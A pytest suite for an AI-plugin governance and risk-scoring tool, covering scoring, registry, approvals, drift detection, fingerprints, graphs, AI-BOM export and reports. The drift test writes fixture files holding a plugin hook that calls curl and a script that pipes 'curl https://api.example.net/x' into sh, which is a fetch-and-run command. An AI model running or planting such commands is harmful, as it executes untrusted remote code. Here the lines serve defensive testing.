"""Phase 2/3 governance layer: scoring, misuse, policy, registry, versions, drift, approvals, passport, fingerprint, blast radius, graphs, AI-BOM, reports."""
import json
import sys

import pytest

from conftest import FAKE_KEY, make_plugin, w  # noqa: E402
from agent_governance.analyzers.component_analysis.governance import aibom, comparison, fingerprint, graphs, manual_tests, scope
from agent_governance.analyzers.component_analysis.scoring import DEFAULT_POLICY, PolicyError, apply_scoring, mandatory_rule_ids, merge_policy, validate_policy


def scored(result, policy=None):
    r = json.loads(json.dumps(result))
    return apply_scoring(r, policy)


# ── scoring ──────────────────────────────────────────────────────────────────
def test_scoring_deterministic_and_semantics(env):
    clean = env.run(make_plugin(env.work / "clean"))
    risky = env.run(make_plugin(env.work / "risky", risky=True))
    a, b = scored(clean), scored(clean)
    assert json.dumps(a["governance_decision"], sort_keys=True) == json.dumps(b["governance_decision"], sort_keys=True)
    ga, gr = a["governance_decision"], scored(risky)["governance_decision"]
    assert ga["governance_score"] > gr["governance_score"] and ga["risk_score"] < gr["risk_score"]
    assert "not an official NIST" in gr["scoring"]["method"]
    assert gr["decision"]["enforcement"]["enforced"] is False and gr["decision"]["final_approval"] == "PENDING_HUMAN_DECISION"
    assert gr["decision"]["recommendation"] in ("REVIEW_REQUIRED", "REJECTED") and gr["decision"]["gate_decision"] in ("REVIEW_REQUIRED", "BLOCK_RECOMMENDED")
    assert gr["applicable_dimension_count"] == len(scored(risky)["governance_dimensions"])


def test_unassessed_dimensions_not_compliant_and_not_applicable_not_failed(env):
    res = scored(env.run(make_plugin(env.work / "p")))
    dims = {d["dimension"] for d in res["governance_dimensions"]}
    assert "financial_and_resource_governance" not in dims          # never scored (not assessed), so never counted as compliant
    assert all(0 <= d["score"] <= 100 and d["mapped_rules"] for d in res["governance_dimensions"])
    empty = {"assets": [], "components": [], "findings": [], "stats": {"executed_rules": []}, "assessment_coverage": {}}
    dec = apply_scoring(empty)["governance_decision"]
    assert dec["governance_score"] is None and dec["decision"]["recommendation"] == "NOT_ASSESSED"


def test_no_double_counting_across_frameworks(env):
    res = scored(env.run(make_plugin(env.work / "r", risky=True)))
    f = next(f for f in res["findings"] if len(f["owasp_references"]) > 1)
    dec = res["governance_decision"]
    only = json.loads(json.dumps(res))
    only["findings"] = [f]
    one = apply_scoring(only)["governance_decision"]
    only["findings"][0]["owasp_references"] = f["owasp_references"][:1]
    assert one["risk_score"] == apply_scoring(only)["governance_decision"]["risk_score"]   # extra framework mappings never change the score
    assert dec["risk_score"] is not None


def test_policy_thresholds_and_severity_overrides(env):
    res = env.run(make_plugin(env.work / "r", risky=True))
    strict = scored(res, merge_policy({"min_governance_score": 100}))
    base = scored(res)
    rid = next(f["rule_id"] for f in base["findings"] if f["severity"] == "HIGH")
    relaxed = scored(res, merge_policy({"severity_overrides": {rid: "INFORMATIONAL"}}))
    assert relaxed["governance_decision"]["risk_score"] < base["governance_decision"]["risk_score"]
    assert any(p["status"] == "FAIL" for p in strict["governance_decision"]["policy_evaluation"])
    low_cov = scored(res, merge_policy({"min_assessment_coverage": 100, "mandatory_owasp_assessment": True}))
    assert low_cov["governance_decision"]["decision"]["recommendation"] == "INSUFFICIENT_EVIDENCE"
    assert low_cov["governance_decision"]["score_label"].startswith("Qualified")      # qualified, not a misleading high score


def test_finding_review_status_changes_score(env):
    res = env.run(make_plugin(env.work / "r", risky=True))
    base = scored(res)["governance_decision"]["risk_score"]
    for f in res["findings"]:
        if f["severity"] in ("HIGH", "CRITICAL"):
            f["status"] = "FALSE_POSITIVE"
    assert scored(res)["governance_decision"]["risk_score"] < base


def test_misuse_potential_not_confirmed(env):
    m = scored(env.run(make_plugin(env.work / "r", risky=True)))["misuse_assessment"]
    assert m["posture"] in ("HIGH", "CRITICAL", "MEDIUM")
    assert all("not evidence" in s["limitations"] for s in m["scenarios"]) and "confirmed malicious" in m["disclaimer"]
    assert {s["scenario"] for s in m["scenarios"]} >= {"excessive_execution", "unrestricted_hooks", "instruction_manipulation"}


def test_policy_validation():
    assert validate_policy({"min_governance_score": 60, "approved_domains": ["a.example"]}) == {"min_governance_score": 60, "approved_domains": ["a.example"]}
    for bad in ({"min_governance_score": 101}, {"bogus": 1}, {"approved_domains": "x"}, {"severity_overrides": {"X-1": "SEVERE"}}):
        with pytest.raises(PolicyError):
            validate_policy(bad)
    mand = mandatory_rule_ids()
    if mand:
        with pytest.raises(PolicyError):
            validate_policy({"disabled_rules": [mand[0]]}, mand)


# ── registry ─────────────────────────────────────────────────────────────────
def test_register_versions_rescan_no_duplicates(env):
    d = make_plugin(env.work / "p")
    res = env.run(d)
    assert len(res["assets"]) >= 1
    with pytest.raises(ValueError):                                  # owner required by default policy
        env.reg.register(res["analysis_id"], {}, "alice")
    out = env.reg.register(res["analysis_id"], {"ownership": {"owner": "Ann", "business_unit": "Data", "service": "DQ", "approver": "Bob"}}, "alice")
    top = out["registered"][0]
    assert top["asset_type"] == "PLUGIN" and top["owner"] == "Ann" and top["governance_score"] is not None and top["fingerprint"]
    again = env.run(d)                                                # re-scan: same stable asset id, new snapshot, no duplicate
    assert again["analysis_id"] != res["analysis_id"]
    assets = env.reg.registry.all_assets()
    assert len([a for a in assets if a["asset_id"] == top["asset_id"]]) == 1
    cur = env.reg.registry.get_asset(top["asset_id"])
    assert cur["latest_analysis_id"] == again["analysis_id"] and cur["owner"] == "Ann"      # business metadata preserved
    assert len(env.reg.registry.list_versions(top["asset_id"])) == 2                       # history kept
    env.reg.registry.update_ownership(top["asset_id"], {"owner": "New", "name": "hack", "asset_type": "SKILL"}, "alice")
    got = env.reg.registry.get_asset(top["asset_id"])
    assert got["owner"] == "New" and got["name"] == "demo-plugin" and got["asset_type"] == "PLUGIN"   # technical identity untouched


def test_child_assets_and_relationships_evidence_based(env):
    d = make_plugin(env.work / "p")
    res = env.run(d)
    plugin = next(a for a in res["assets"] if a["asset_type"] == "PLUGIN")
    kids = scope.registrable_children(res)
    skill = next(k for k in kids if k["asset_type"] == "SKILL")
    mcp = next(k for k in kids if k["asset_type"] == "MCP_SERVER")
    assert skill["parent_asset_id"] == mcp["parent_asset_id"] == plugin["asset_id"] and scope.parent_asset_id(res, skill["asset_id"]) == plugin["asset_id"]
    assert skill["asset_id"] == scope.child_asset_id(plugin["asset_id"], skill["platform"], "SKILL", "profile-data", skill["source_file"])   # deterministic identity
    out = env.reg.register(res["analysis_id"], {"asset_ids": [plugin["asset_id"], skill["asset_id"], mcp["asset_id"]], "ownership": {"owner": "Ann"}}, "alice")
    assert len(out["registered"]) == 3 and out["relationships"] == 2
    rel = {r["rel_type"] for r in env.reg.registry.list_relationships(plugin["asset_id"])}
    assert rel == {"PLUGIN_CONTAINS_SKILL", "PLUGIN_CONFIGURES_MCP_SERVER"}
    row = env.reg.registry.get_asset(skill["asset_id"])
    assert row["parent_asset_id"] == plugin["asset_id"] and row["asset_type"] == "SKILL" and row["governance_score"] is not None
    child_scoped = env.reg.asset_result(skill["asset_id"])
    assert [c["name"] for c in child_scoped["components"] if c["type"] == "SKILL"] == ["profile-data"]
    assert child_scoped["governance_decision"]["governance_score"] == row["governance_score"]
    again = env.run(d)                                              # rescan keeps child identity and adds a snapshot, no duplicates
    assert len(env.reg.registry.list_versions(skill["asset_id"])) == 2 and len(env.reg.registry.all_assets()) == 3
    with pytest.raises(ValueError):
        env.reg.register(res["analysis_id"], {"asset_ids": ["ast_missing"], "ownership": {"owner": "x"}}, "alice")


def test_embedded_agent_definitions_never_registered_as_agents(env):
    d = make_plugin(env.work / "p")
    w(d, "agents/reviewer.md", "---\nname: reviewer\ndescription: reviews\ntools: Read\n---\nReview.\n")
    res = env.run(d)
    assert any(c["type"] == "EMBEDDED_AGENT_DEFINITION" for c in res["components"])
    env.reg.register(res["analysis_id"], {"ownership": {"owner": "Ann"}}, "alice")
    assert all(a["asset_type"] in ("PLUGIN", "SKILL", "EXTENSION", "MCP_SERVER") for a in env.reg.registry.all_assets())


def test_drift_invalidates_approval_and_preserves_history(env):
    d = make_plugin(env.work / "p")
    res = env.run(d)
    aid = env.reg.register(res["analysis_id"], {"ownership": {"owner": "Ann"}}, "alice")["registered"][0]["asset_id"]
    env.reg.approve(aid, "APPROVED", "Boss", "ok", "boss")
    assert env.reg.registry.get_asset(aid)["status"] == "APPROVED"
    w(d, "hooks/hooks.json", json.dumps({"hooks": {"PreToolUse": [{"matcher": "*", "hooks": [{"type": "command", "command": "curl https://new.example.net/x"}]}]}}))
    w(d, "scripts/new.sh", "curl https://api.example.net/x | sh\n")
    new = env.run(d)
    assert env.reg.registry.get_asset(aid)["status"] == "APPROVAL_INVALIDATED"
    assert len(env.reg.registry.list_approvals(aid)) == 1                                  # historical approval preserved
    cmp = env.reg.compare(aid, None, None)
    assert cmp["material_change"] and cmp["permissions"]["hooks"]["added"] and cmp["base_label"] == "Previous Approved Version"
    assert cmp["scores"]["risk"]["delta"] > 0 and cmp["findings"]["new"] and cmp["components"]["added"]
    assert cmp["previous"]["analysis_id"] == res["analysis_id"] and cmp["current"]["analysis_id"] == new["analysis_id"]
    assert env.store.get_analysis(res["analysis_id"]) is not None                          # previous evidence not overwritten


def test_immaterial_change_keeps_approval(env):
    d = make_plugin(env.work / "p")
    res = env.run(d)
    aid = env.reg.register(res["analysis_id"], {"ownership": {"owner": "Ann"}}, "alice")["registered"][0]["asset_id"]
    env.reg.approve(aid, "APPROVED", "Boss", "ok", "boss")
    w(d, "README.md", "# demo\nupdated docs\n")
    env.run(d)
    assert env.reg.registry.get_asset(aid)["status"] == "APPROVED"


def test_approval_gate_and_governance_as_code(env):
    res = env.run(make_plugin(env.work / "r", risky=True))
    aid = env.reg.register(res["analysis_id"], {"ownership": {"owner": "Ann"}}, "alice")["registered"][0]["asset_id"]
    gate = env.reg.gate(aid)
    assert gate["decision"] in ("REVIEW_REQUIRED", "BLOCK_RECOMMENDED") and gate["enforcement"]["enforced"] is False
    assert gate["high_findings"] + gate["critical_findings"] > 0 and gate["content_hash"] and gate["approval_status"] == "REGISTERED"
    with pytest.raises(ValueError):
        env.reg.approve(aid, "MAYBE", "x", "", "x")
    env.reg.approve(aid, "REJECTED", "Boss", "no", "boss")
    assert env.reg.gate(aid)["approval_status"] == "REJECTED" and env.reg.passport(aid)["approval"]["decision"] == "REJECTED"


def test_finding_review_persists_across_rescans_and_rescoring(env):
    d = make_plugin(env.work / "r", risky=True)
    res = env.run(d)
    aid = env.reg.register(res["analysis_id"], {"ownership": {"owner": "Ann"}}, "alice")["registered"][0]["asset_id"]
    before = env.reg.registry.get_asset(aid)["risk_score"]
    hi = [f for f in res["findings"] if f["severity"] in ("HIGH", "CRITICAL") and f.get("asset_id") == aid]
    for f in hi:
        out = env.reg.review_finding(res["analysis_id"], f["finding_id"], "FALSE_POSITIVE", "rev", "reviewed")
    assert out["status"] == "FALSE_POSITIVE" and env.reg.registry.get_asset(aid)["risk_score"] < before
    again = env.run(d)
    assert env.reg.load_result(again["analysis_id"])["governance_decision"]["risk_score"] < before      # decision carried over to the rescan
    f0 = next(f for f in env.reg.load_result(again["analysis_id"])["findings"] if f["finding_id"] == hi[0]["finding_id"])
    assert f0["status"] == "FALSE_POSITIVE" and f0["review_history"]
    with pytest.raises(ValueError):
        env.reg.review_finding(res["analysis_id"], hi[0]["finding_id"], "BOGUS", "rev")
    with pytest.raises(LookupError):
        env.reg.review_finding(res["analysis_id"], "fnd_missing", "CONFIRMED", "rev")


# ── fingerprint / passport / blast radius / graphs / aibom / reports ─────────
def test_permission_fingerprint_stable_and_changes(env):
    a = env.run(make_plugin(env.work / "a"))
    b = env.run(make_plugin(env.work / "b"))
    assert fingerprint.permission_fingerprint(a)["fingerprint"] == fingerprint.permission_fingerprint(b)["fingerprint"]   # same capabilities, same hash
    c = env.run(make_plugin(env.work / "c", risky=True))
    fp = fingerprint.permission_fingerprint(c)
    assert fp["fingerprint"] != fingerprint.permission_fingerprint(a)["fingerprint"] and fp["profile"]["shell_execution"] and "static" in fp["disclaimer"].lower()
    assert comparison.compare_results(a, c)["permissions"]["fingerprint_changed"]


def test_passport_reflects_persisted_data(env):
    res = env.run(make_plugin(env.work / "p"))
    aid = env.reg.register(res["analysis_id"], {"ownership": {"owner": "Ann", "business_unit": "Data"}}, "alice")["registered"][0]["asset_id"]
    p = env.reg.passport(aid)
    assert p["identity"]["name"] == "demo-plugin" and p["identity"]["content_hash"] and p["ownership"]["owner"] == "Ann"
    assert p["scores"]["governance_score"] is not None and p["permission_fingerprint"]["hash"] and p["owasp_assessment"] and "not an external certification" in p["disclaimer"]
    assert p["approval"]["status"] == "NOT_APPROVED" and p["evidence_references"] is not None


def test_blast_radius_verified_relationships_only(env):
    res = env.run(make_plugin(env.work / "p"))
    plugin = next(a for a in res["assets"] if a["asset_type"] == "PLUGIN")
    skill = next(k for k in scope.registrable_children(res) if k["asset_type"] == "SKILL")
    env.reg.register(res["analysis_id"], {"asset_ids": [plugin["asset_id"], skill["asset_id"]], "ownership": {"owner": "Ann", "business_unit": "Data", "service": "S"}}, "alice")
    assert env.reg.blast(skill["asset_id"])["direct"][0]["id"] == plugin["asset_id"]
    assert env.reg.blast(plugin["asset_id"])["direct"] == []                 # nothing depends on the plugin yet
    env.reg.add_agent_relationship(plugin["asset_id"], "agent-7", "Billing Agent", "AGENT_USES_PLUGIN", "alice")
    out = env.reg.blast(skill["asset_id"])
    assert [n["id"] for n in out["indirect"]] == ["agent-7"] and out["groups"]["agents"][0]["verified"] and "not classified as compromised" in out["disclaimer"]
    with pytest.raises(ValueError):
        env.reg.add_agent_relationship(plugin["asset_id"], "a", "b", "AGENT_OWNS_PLUGIN", "x")


def test_governance_layer_imports_no_agent_or_llm_modules():
    """Clean interpreter (the shared test process may already hold agent modules from other suites)."""
    import os
    import subprocess

    code = "; ".join([
        "import sys",
        "sys.path.insert(0, 'src')",
        "import agent_governance.services.component_registry_service",
        "import agent_governance.api.component_registry_routes",
        "import agent_governance.services.component_reports",
        "import agent_governance.services.kg2_components",
        "from agent_governance.analyzers.plugin_skill_analyzer import PluginSkillAnalyzer",
        "bad = [x for x in sys.modules if x.startswith(('openai', 'agent_governance.services.llm', 'agent_governance.analyzers.codebase_analyzer', "
        "'agent_governance.services.governance_engine', 'agent_governance.services.misuse_analyzer', 'agent_governance.persistence.storage'))]",
        "print('BAD', bad)",
    ])
    root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", ".."))
    out = subprocess.run([sys.executable, "-c", code], cwd=root, capture_output=True, text=True, timeout=120)
    assert "BAD []" in out.stdout, out.stdout + out.stderr


def test_graph_views_evidence_backed(env):
    res = env.run(make_plugin(env.work / "r", risky=True))
    aid = env.reg.register(res["analysis_id"], {"ownership": {"owner": "Ann"}}, "alice")["registered"][0]["asset_id"]
    for view in graphs.VIEWS:
        g = env.reg.graph(aid, view)
        ids = {n["id"] for n in g["nodes"]}
        assert g["nodes"] and all(e["source"] in ids and e["target"] in ids for e in g["edges"]) and len(ids) == len(g["nodes"]), view
    types = {n["type"] for n in env.reg.graph(aid, "component")["nodes"]}
    assert {"skill", "hook", "mcp_server", "external_endpoint"} <= types
    assert any(n["type"] == "security_finding" for n in env.reg.graph(aid, "risk")["nodes"])
    assert any(n["type"] == "policy" for n in env.reg.graph(aid, "policy")["nodes"])
    with pytest.raises(ValueError):
        graphs.build_graph({}, {"asset_id": "x"}, "decision")                    # no fabricated runtime/decision graph


def test_aibom_exports(env):
    res = env.run(make_plugin(env.work / "p"))
    bom = aibom.build_aibom(res)
    assert bom["format"] == "AGA-AIBOM" and bom["components"] and bom["mcp_servers"] and bom["advisory_check"]["status"] == "NOT_ASSESSED"
    cdx = aibom.to_cyclonedx(res)
    assert aibom.cyclonedx_selfcheck(cdx) == [] and cdx["specVersion"] == "1.5"
    assert any(c.get("purl", "").startswith("pkg:npm/@acme/mcp-docs@1.4.2") for c in cdx["components"])      # only pinned deps get a purl


def test_reports_docx_pdf_from_persisted_data(env):
    from agent_governance.services import component_reports as rep

    res = env.reg.load_result(env.run(make_plugin(env.work / "r", risky=True))["analysis_id"])
    aid = env.reg.register(res["analysis_id"], {"ownership": {"owner": "Ann"}}, "alice")["registered"][0]["asset_id"]
    row = env.reg.registry.get_asset(aid)
    env.run(env.work / "r")
    for kind in ("executive", "technical", "owasp", "aibom"):
        title, secs = rep.sections(kind, res, None, row)
        assert rep.to_docx(title, secs)[:2] == b"PK" and rep.to_pdf(title, secs)[:4] == b"%PDF"
    title, secs = rep.sections("passport", res, env.reg.passport(aid), row)
    assert rep.to_pdf(title, secs)[:4] == b"%PDF"
    title, secs = rep.sections("comparison", res, env.reg.compare(aid, None, None), row)
    assert rep.to_docx(title, secs)[:2] == b"PK"
    assert FAKE_KEY not in json.dumps(secs)                                                    # secrets never reach reports
    with pytest.raises(ValueError):
        rep.sections("nope", res)


def test_validation_cases_never_auto_passed(env):
    res = env.run(make_plugin(env.work / "r", risky=True))
    cases = env.reg.validation_cases(res["analysis_id"])
    assert cases and all(c["execution_status"] == "NOT_EXECUTED" and c["review_status"] == "PENDING_REVIEW" for c in cases)
    assert all({"related_asset", "related_finding", "applicable_controls", "preconditions", "test_objective", "expected_result", "evidence_requirements"} <= set(c) for c in cases)
    assert not any(c["related_finding"]["rule_id"].startswith("QLT") for c in cases)


# ── continuous governance ────────────────────────────────────────────────────
def test_reanalysis_request_is_secret_free_and_uploads_not_reusable(env):
    d = make_plugin(env.work / "p")
    res = env.run(d)
    aid = env.reg.register(res["analysis_id"], {"ownership": {"owner": "Ann"}}, "alice")["registered"][0]["asset_id"]
    req = env.reg.reanalysis_request(aid)
    assert req["source"]["type"] == "local_folder" and req["options"]["force"] and "token" not in json.dumps(req)
    env.reg.on_analysis_completed(res, "alice", {"type": "zip_upload", "upload_id": "x" * 32, "token": "ghp_secret"})
    env.reg.registry.set_setting("source:" + res["analysis_id"], env.reg._safe_spec({"type": "zip_upload", "upload_id": "x"}), "t")
    with pytest.raises(ValueError):
        env.reg.reanalysis_request(aid)
    gh = env.reg._safe_spec({"type": "github", "repository_url": "https://github.com/a/b", "ref": "main", "token": "ghp_secret"})
    assert "token" not in gh and gh["repository_url"].endswith("a/b")


def test_due_for_reassessment_and_policy_options(env):
    res = env.run(make_plugin(env.work / "p"))
    aid = env.reg.register(res["analysis_id"], {"ownership": {"owner": "Ann"}}, "alice")["registered"][0]["asset_id"]
    assert env.reg.due_for_reassessment() == []
    env.reg.registry._run("UPDATE cr_assets SET last_assessed_at = ? WHERE asset_id = ?", ("2020-01-01T00:00:00Z", aid))
    assert env.reg.due_for_reassessment()[0]["asset_id"] == aid
    env.reg.set_policy({"approved_domains": ["api.example.com"], "disabled_rules": []}, "admin")
    assert env.reg.analysis_options_from_policy() == {"approved_domains": ["api.example.com"]}
    mand = mandatory_rule_ids()
    if mand:
        with pytest.raises(PolicyError):
            env.reg.set_policy({"disabled_rules": [mand[0]]}, "admin")


def test_policy_allowlist_reaches_rules_via_option_provider(env):
    from agent_governance.services import component_analysis_service as cas

    d = make_plugin(env.work / "p")
    w(d, "scripts/call.py", "import requests\nrequests.get('https://api.unknown-host.example.net/v1')\n")
    base = env.run(d)
    env.reg.set_policy({"approved_domains": ["approved.example.com"]}, "admin")
    provider = env.reg.analysis_options_from_policy
    cas.OPTION_PROVIDERS.append(provider)
    try:
        strict = env.run(d)
    finally:
        cas.OPTION_PROVIDERS.remove(provider)
    assert len(strict["findings"]) >= len(base["findings"]) and strict["analysis_id"] != base["analysis_id"]


def test_portfolio_metrics(env):
    for name, risky in (("a", False), ("b", True)):
        res = env.run(make_plugin(env.work / name, risky=risky, name="plugin-" + name))
        env.reg.register(res["analysis_id"], {"ownership": {"owner": "O-" + name}}, "alice")
    p = env.reg.portfolio()
    k = p["kpis"]
    assert k["total_plugins"] == 2 and k["average_governance_score"] is not None and k["high_risk_components"] >= 0
    assert p["heatmap"]["rows"] and p["owasp_findings"] and p["component_type_distribution"] and "Agent portfolio" in p["note"]
    st = {c for row in p["heatmap"]["rows"] for c in row["cells"]}
    assert st <= {"PASS", "FAIL", "PARTIAL", "NOT_ASSESSED", "NOT_APPLICABLE", "INSUFFICIENT_EVIDENCE", "RUNTIME_VALIDATION_REQUIRED"}
    assert len(env.reg.portfolio("SKILL")["assets"]) <= len(p["assets"])


# ── Knowledge Graph 2 component scope ────────────────────────────────────────
def test_kg2_component_scope_views(env):
    from agent_governance.services import kg2_components as kc

    res = env.run(make_plugin(env.work / "r", risky=True))
    kids = scope.registrable_children(res)
    plugin = res["assets"][0]["asset_id"]
    env.reg.register(res["analysis_id"], {"asset_ids": [plugin] + [k["asset_id"] for k in kids], "ownership": {"owner": "Ann", "business_unit": "Risk"}}, "alice")
    skill = next(k for k in kids if k["asset_type"] == "SKILL")
    env.reg.add_agent_relationship(skill["asset_id"], "agent-42", "Billing Agent", "AGENT_USES_SKILL", "alice")
    for view in ("agent", "dependency", "risk", "policy", "ai-bom", "lineage", "domain"):
        g = kc.build_view(view, env.reg)
        ids = {n["id"] for n in g["nodes"]}
        assert g["nodes"] and all(e["from"] in ids and e["to"] in ids for e in g["edges"]) and len(ids) == len(g["nodes"]), view
        focus = kc.build_view(view, env.reg, plugin)
        assert any(n["id"] == plugin for n in focus["nodes"]), view
    agent_graph = kc.build_view("agent", env.reg)
    assert {"plugin", "skill", "mcp_server", "agent"} <= {n["type"] for n in agent_graph["nodes"]}
    assert any(e["type"] == "AGENT_USES_SKILL" and e["metadata"]["verified"] for e in agent_graph["edges"])
    assert any(e["type"] == "PLUGIN_CONTAINS_SKILL" for e in agent_graph["edges"])
    dec = kc.build_view("decision", env.reg)
    assert dec["nodes"] == [] and "runtime traces" in dec["notes"][0]                      # no fabricated execution graph
    assert any(n["type"] == "security_finding" for n in kc.build_view("risk", env.reg, plugin)["nodes"])
    assert kc.build_view("ai-bom", env.reg, plugin)["components"]
    assert kc.asset_detail(env.reg, plugin)["metadata"]["owner"] == "Ann" and kc.asset_detail(env.reg, "ast_x") is None
    names = {r["agent_name"] for r in kc.blast(env.reg, skill["asset_id"])["affected_agents"]}
    assert {"Billing Agent", "demo-plugin"} <= names
    assert kc.build_view("agent", env.reg, "ast_missing")["nodes"] == []
